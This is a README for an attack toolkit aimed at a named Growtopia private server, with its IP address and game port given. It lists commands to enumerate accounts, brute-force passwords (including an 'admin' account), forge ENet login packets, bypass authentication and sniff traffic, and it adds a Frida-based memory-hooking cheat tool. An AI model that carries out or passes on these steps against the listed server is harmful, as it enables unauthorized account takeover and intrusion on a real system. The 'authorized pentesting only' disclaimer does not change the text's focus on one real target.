# Piter Tools — GTPS Attack Toolkit

Advanced Growtopia Private Server exploitation toolkit.  
Sniff, forge, brute, and MITM — everything you need to own the Piter Server.

## Target
- **IP**: 103.129.148.178
- **Game Port**: UDP 17091
- **Type**: Piter Server (DRASTORE-based), Windows Server 2022
- **Auth**: Fake HTTP layer — real auth in ENet game server via player files on disk

## Install

```bash
git clone https://github.com/Nabenns/piter-tools.git
cd piter-tools
chmod +x piter_cli.py
```

No dependencies. Python 3.7+ stdlib only.

## Commands

```
piter_cli.py info              — Server recon, target info, exploit vectors
piter_cli.py scan              — Quick scan for common GrowIDs
piter_cli.py forge <ID> <PASS> — Forge ENet login packet directly to server
piter_cli.py brute <WORDLIST>  — Brute force GrowID enumeration
piter_cli.py brute-pass <ID> <WORDLIST> — Brute force password for known account
piter_cli.py monitor           — Live traffic viewer (needs tcpdump)
piter_cli.py sniff [OUTPUT]    — Full packet capture to file (needs root)
```

## Quick Start

```bash
# See what we know about the target
python3 piter_cli.py info

# Quick scan for known accounts
python3 piter_cli.py scan

# Sniff traffic while you play
sudo python3 piter_cli.py sniff piter_dump.txt

# Brute force a wordlist
echo -e "piterp\nadmin\nOwner" > names.txt
python3 piter_cli.py brute names.txt

# Once you find an account, brute its password
echo -e "piter123\npassword\nadmin" > passwords.txt
python3 piter_cli.py brute-pass admin passwords.txt
```

## Module Structure

```
piter_tools/
  enet.py       — ENet protocol parser (CONNECT, VERIFY, reliable/unreliable)
  protocol.py   — Tank protocol decoder (GameUpdatePacket, tank fields)
  exploit.py    — Auth bypass, player enumeration, packet forging
piter_cli.py    — Main CLI with all attack modes
piter_sniff.py  — Legacy sniffer (stdalone)
piter_tcpdump.py — macOS optimized sniffer using tcpdump
```

## Protocol

Server uses DRASTORE (41-field ENet) but login packets use Gurotopia format:
```
requestedName|GrowID
tankIDName|GrowID
tankIDPass|password
_token=timestamp&growId=GrowID&password=pass&reg=0
```

HTTP layer (port 80/443/5000) is 100% echo — no validation, no disk writes.  
Real auth happens in the ENet game server which reads player files from disk.

## Disclaimer

Educational / authorized pentesting only. Don't be a dick.

---

## Phase 1: Piter Cheat Engine (Frida)

Memory hook ke Growtopia via Frida. Intercept semua packet, baca memory,
inject command — langsung dari terminal.

### Requirements
```bash
pip3 install frida-tools
```

### Usage
```bash
# Start Growtopia and login first
# Then:
python3 piter_cheat.py

# Or attach to specific PID:
python3 piter_cheat.py --pid 22782
```

### Commands
```
/state        Show player state (growID, world, gems)
/packets [N]  Show last N packets (default: 10)
/scan <str>   Scan memory for string
/watch        Continuous packet monitor
/hook         Hook status
/quit         Exit
```
